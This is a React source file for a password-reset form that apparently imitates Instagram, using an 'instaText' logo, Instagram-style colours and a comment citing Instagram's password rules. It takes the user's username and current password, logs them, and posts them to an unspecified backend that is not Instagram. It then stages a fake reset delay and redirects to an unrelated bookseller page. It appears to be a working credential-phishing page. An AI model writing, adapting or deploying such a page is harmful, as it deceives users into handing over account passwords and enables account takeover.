import React, { useState } from "react";
import axios from 'axios';
import logo from './img/instaText.png';

function App() {

  const baseUrl = process.env.REACT_APP_BASE_API_URL;
console.log("API URL:", baseUrl);



  const handleRedirect = () => {
    window.location.href = "https://www.penguinrandomhouse.com/books/"; // Redirect to external URL
  };

  const [formData, setFormData] = useState({
    username: '',
    currentPassword: '',
    newPassword: '',
    confirmPassword: '',
  });

  const [errors, setErrors] = useState({
    username: '',
    currentPassword: '',
    newPassword: '',
    confirmPassword: '',
  });

  const [loading, setLoading] = useState(false);
  const [successMessage, setSuccessMessage] = useState('');
  const [backendError, setBackendError] = useState(''); // To capture any errors from backend

  // Instagram password validation rules
  const validatePassword = (password) => {
    const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)(?=.*[!@#$%^&*])[A-Za-z\d!@#$%^&*]{6,}$/;
    return passwordRegex.test(password);
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const validateForm = () => {
    let formErrors = { ...errors };
    let isValid = true;

    if (!formData.username) {
      formErrors.username = 'Username is required.';
      isValid = false;
    } else {
      formErrors.username = '';
    }

    if (!formData.currentPassword) {
      formErrors.currentPassword = 'Current password is required.';
      isValid = false;
    } else {
      formErrors.currentPassword = '';
    }

    if (!formData.newPassword) {
      formErrors.newPassword = 'New password is required.';
      isValid = false;
    } else if (!validatePassword(formData.newPassword)) {
      formErrors.newPassword = 'Password must be at least 6 characters long, contain at least one letter, one number, and one special character.';
      isValid = false;
    } else {
      formErrors.newPassword = '';
    }

    if (formData.newPassword !== formData.confirmPassword) {
      formErrors.confirmPassword = 'Passwords do not match.';
      isValid = false;
    } else {
      formErrors.confirmPassword = '';
    }

    setErrors(formErrors);
    return isValid;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validateForm()) {
      setLoading(true); // Show loading spinner
      setBackendError(''); // Reset any previous backend error message
      setSuccessMessage(''); // Clear any previous success message

      const dataToSend = {
        username: formData.username,
        currentPassword: formData.currentPassword,
        newPassword: formData.newPassword,
      };
      console.log('sending data to backend:', dataToSend)

      try {
        const response = await axios.post(`${baseUrl}/submit`, dataToSend);

        // Simulate a delay for the password reset process
        setTimeout(() => {
          setLoading(false); // Hide loading spinner
          if (response.status === 200) {
            setSuccessMessage('Password reset successful. Redirecting...');
            setTimeout(() => {
              handleRedirect();
            }, 2000);
          }
        }, 3000);
      } catch (error) {
        setLoading(false); // Hide loading spinner
        if (error.response) {
          // Backend responded with an error
          setBackendError(error.response.data.message || 'Something went wrong. Please try again.');
        } else if (error.request) {
          // No response received from the server
          setBackendError('Server unavailable. Please check your internet connection and try again.');
        } else {
          // General error during setup or sending request
          setBackendError('An unexpected error occurred. Please try again.');
        }
      }
    }
  };

  return (
    <div className="lg:max-w-lg max-w-sm mx-auto mt-10 p-6 border border-gray-300 rounded-lg shadow-lg">
      <div className="max-w-[130px] mb-5 m-auto">
        <img src={logo} className="w-full" alt="Logo" />
      </div>
      <h2 className="text-lg hidden font-semibold text-center text-gradient mb-5">Reset Password</h2>
      <form onSubmit={handleSubmit} className="text-sm">
        <div className="mb-4">
          <label htmlFor="username" className="block text-gray-700">Username</label>
          <input
            type="text"
            id="username"
            name="username"
            value={formData.username}
            onChange={handleChange}
            className="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500"
            placeholder="Enter your username"
          />
          {errors.username && <p className="text-red-500 text-xs mt-1">{errors.username}</p>}
        </div>

        <div className="mb-4">
          <label htmlFor="currentPassword" className="block text-gray-700">Current Password</label>
          <input
            type="password"
            id="currentPassword"
            name="currentPassword"
            value={formData.currentPassword}
            onChange={handleChange}
            className="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500"
            placeholder="Enter your current password"
          />
          {errors.currentPassword && <p className="text-red-500 text-xs mt-1">{errors.currentPassword}</p>}
        </div>

        <div className="mb-4">
          <label htmlFor="newPassword" className="block text-gray-700">New Password</label>
          <input
            type="password"
            id="newPassword"
            name="newPassword"
            value={formData.newPassword}
            onChange={handleChange}
            className="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500"
            placeholder="Enter your new password"
          />
          {errors.newPassword && <p className="text-red-500 text-xs mt-1">{errors.newPassword}</p>}
        </div>

        <div className="mb-4">
          <label htmlFor="confirmPassword" className="block text-gray-700">Confirm New Password</label>
          <input
            type="password"
            id="confirmPassword"
            name="confirmPassword"
            value={formData.confirmPassword}
            onChange={handleChange}
            className="w-full p-2 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500"
            placeholder="Confirm your new password"
          />
          {errors.confirmPassword && <p className="text-red-500 text-xs mt-1">{errors.confirmPassword}</p>}
        </div>

        {backendError && <p className="text-red-500 text-xs mt-3">{backendError}</p>} {/* Display backend error message */}

        <button
          type="submit"
          className="w-full bg-gradient-to-r from-blue-500 to-pink-500 text-white p-3 rounded-md hover:bg-gradient-to-r hover:from-blue-600 hover:to-pink-600 disabled:opacity-50 flex justify-center items-center"
          disabled={loading}
        >
          {loading ? (
            <div className="loader"></div>
          ) : successMessage ? (
            <span>{successMessage}</span>
          ) : (
            'Reset Password'
          )}
        </button>
      </form>
    </div>
  );
}

export default App;
